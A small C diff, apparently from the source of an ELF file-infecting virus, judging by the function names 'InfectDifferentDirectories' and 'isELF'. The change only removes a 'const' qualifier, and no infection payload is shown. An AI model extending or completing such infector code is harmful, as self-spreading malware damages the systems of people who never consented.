@@ -66,7 +66,7 @@ void InfectDifferentDirectories(char* argv[]) {
 
 
 
-int isELF(const char* fileName) {
+int isELF(char* fileName) {
     // Check if the file name starts with a dot (hidden file)
     if (fileName[0] == '.')
         return 0;
